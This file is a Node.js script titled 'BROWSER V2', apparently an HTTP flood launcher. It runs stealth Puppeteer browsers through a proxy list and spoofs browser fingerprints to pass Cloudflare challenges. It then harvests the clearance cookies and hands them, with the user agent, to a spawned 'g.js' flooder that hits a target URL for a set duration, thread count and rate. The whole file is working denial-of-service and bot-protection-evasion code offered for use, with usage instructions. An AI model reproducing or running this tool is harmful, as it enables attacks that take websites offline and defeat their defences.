const { promises: fsPromises } = require('fs');
const puppeteer = require('puppeteer-extra');
const puppeteerStealth = require('puppeteer-extra-plugin-stealth');
const { spawn } = require('child_process');
const { exec } = require('child_process');
const pLimit = require('p-limit');

puppeteer.use(puppeteerStealth());

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threadsInput = process.argv[4];
const thread = parseInt(process.argv[5]);
const rates = process.argv[6];
const proxyFile = process.argv[7];

// Kiểm tra tham số
const threads = parseInt(threadsInput, 10);
if (!targetURL || !threadsInput || isNaN(threads) || threads <= 0 || !proxyFile || isNaN(duration) || isNaN(thread) || !rates) {
    console.clear();
    console.log(`
        BROWSER V2 | Updated: May 10, 2025
        
        Usage:
            node ${process.argv[1]} <target> <duration> <threads_browser> <threads_flood> <rates> <proxy>
            Example: node ${process.argv[1]} https://example.com 400 30 2 30 proxy.txt
    `);
    process.exit(1);
}
if (!/^https?:\/\//i.test(targetURL)) {
    console.error('URL must start with http:// or https://');
    process.exit(1);
}

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}

const rd = generateRandomNumber(100, 135);
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rd}.0.0.0 Safari/537.36`
];

async function spoofFingerprint(page) {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(window, 'screen', {
            value: { width: 1920, height: 1080, availWidth: 1920, availHeight: 1080, colorDepth: 64, pixelDepth: 64 }
        });
        Object.defineProperty(navigator, 'userAgent', {
            value: userAgent
        });
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
            const originalGetParameter = gl.getParameter;
            gl.getParameter = function(parameter) {
                if (parameter === gl.VENDOR) return 'WebKit';
                else if (parameter === gl.RENDERER) return 'Apple GPU';
                else return originalGetParameter.call(this, parameter);
            };
        }
        Object.defineProperty(navigator, 'plugins', {
            value: [{ name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format', length: 1 }]
        });
        Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'] });
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(document, 'cookie', {
            configurable: true,
            enumerable: true,
            get: function() { return ''; },
            set: function() {}
        });
        Object.defineProperty(navigator, 'cookiesEnabled', {
            configurable: true,
            enumerable: true,
            get: function() { return true; },
            set: function() {}
        });
        Object.defineProperty(window, 'localStorage', {
            configurable: true,
            enumerable: true,
            value: {
                getItem: function() { return null; },
                setItem: function() {},
                removeItem: function() {}
            }
        });
        Object.defineProperty(navigator, 'doNotTrack', { value: null });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 10 });
        Object.defineProperty(navigator, 'language', { value: 'en-US' });
        Object.defineProperty(navigator, 'vendorSub', { value: '' });
    });
}

const readProxiesFromFile = async (filePath) => {
    try {
        const data = await fsPromises.readFile(filePath, 'utf8');
        return data.trim().split(/\r?\n/);
    } catch (error) {
        console.error('Error reading proxies file:', error);
        return [];
    }
};

async function launchBrowserWithRetry(targetURL, browserProxy, attempt = 1, maxRetries = 3) {
    const userAgent = randomElement(userAgents);
    const options = {
        headless: 'new',
        ignoreHTTPSErrors: true,
        args: [
            `--proxy-server=${browserProxy}`,
            `--user-agent=${userAgent}`,
            '--no-sandbox',
            '--disable-gpu',
            '--disable-dev-shm-usage',
            '--ignore-certificate-errors',
            '--disable-background-networking',
            '--disable-renderer-backgrounding',
            '--disable-popup-blocking',
            '--no-first-run',
            '--metrics-recording-only',
            '--disable-blink-features=AutomationControlled'
        ],
        defaultViewport: {
            width: 360,
            height: 640,
            deviceScaleFactor: 3,
            isMobile: true,
            hasTouch: Math.random() < 0.5
        }
    };

    let browser;
    try {
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Chặn tài nguyên an toàn
        await page.setRequestInterception(true);
        page.on('request', request => {
            const resourceType = request.resourceType();
            const url = request.url();
            if (resourceType === 'script' && url.includes('challenges.cloudflare.com')) {
                request.continue();
            } else if (['image', 'media'].includes(resourceType)) {
                request.abort();
            } else {
                request.continue();
            }
        });

        await spoofFingerprint(page);
        page.setDefaultNavigationTimeout(3000);
        const response = await page.waitForResponse(res => res.url().includes(targetURL), { timeout: 3000 }).catch(() => null);
        if (!response) throw new Error('No response received');

        const title = await page.title();
        if (title === 'Attention Required! | Cloudflare') {
            throw new Error('Blocked by Cloudflare');
        }

        const cookies = await page.cookies(targetURL);
        const cookieString = cookies
            .filter(cookie => ['__cf_bm', 'cf_clearance', 'session_id', 'auth_token'].includes(cookie.name))
            .map(cookie => `${cookie.name}=${cookie.value}`)
            .join('; ')
            .trim();

        if (!cookieString.includes('__cf_bm') && !cookieString.includes('cf_clearance')) {
            throw new Error('Missing Cloudflare clearance cookie');
        }

        return {
            title,
            browserProxy,
            cookies: cookieString,
            userAgent
        };
    } catch (error) {
        if (attempt <= maxRetries) {
            return await launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        console.log(`[ERROR] Browser failed: ${error.message}`);
        return null;
    } finally {
        if (browser) await browser.close().catch(() => {});
    }
}

let cookieCount = 0;
async function startThread(targetURL, browserProxy) {
    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        if (!response) return;

        cookieCount++;
        const cookies = `[INFO] Total solve: ${cookieCount}\n[INFO] Title: ${response.title}\n[INFO] Proxy: ${response.browserProxy}\n[INFO] Cookies: ${response.cookies}\n[INFO] Useragent: ${response.userAgent}`;
        console.log(cookies);

        spawn('node', [
            'g.js',
            targetURL,
            duration,
            thread,
            response.browserProxy,
            rates,
            response.cookies,
            response.userAgent
        ]);
    } catch (error) {
        console.log(`[ERROR] Thread failed: ${error.message}`);
    }
}

async function main() {
    console.clear();
    console.log('[INFO] Running...');
    console.log(`[INFO] Target: ${targetURL}`);
    console.log(`[INFO] Duration: ${duration} seconds`);
    console.log(`[INFO] Threads Browser: ${threads}`);
    console.log(`[INFO] Threads Flooder: ${thread}`);
    console.log(`[INFO] Rates Flooder: ${rates}`);
    console.log(`[INFO] Proxies: Loading... | Filename: ${proxyFile}`);

    const proxies = await readProxiesFromFile(proxyFile);
    console.log(`[INFO] Proxies: ${proxies.length} | Filename: ${proxyFile}`);
    if (proxies.length === 0) {
        console.log('[ERROR] No proxies found in file. Exiting.');
        process.exit(1);
    }

    const limit = pLimit(threads);
    const tasks = proxies.map(browserProxy => limit(() => startThread(targetURL, browserProxy)));
    await Promise.all(tasks);

    console.log('[INFO] Time\'s up! Cleaning up...');
    exec('pkill -f g.js', (err) => {
        if (err && err.code !== 1) {
            console.log('[ERROR] Failed to kill g.js processes');
        } else {
            console.log('[INFO] Successfully killed g.js processes');
        }
    });
    exec('pkill -f chrome', (err) => {
        if (err && err.code !== 1) {
            console.log('[ERROR] Failed to kill Chrome processes');
        } else {
            console.log('[INFO] Successfully killed Chrome processes');
        }
    });
    await sleep(5);
    console.log('[INFO] Exiting');
    process.exit(0);
}

main().catch(err => {
    console.log(`[ERROR] Main function error: ${err.message}`);
    process.exit(1);
});
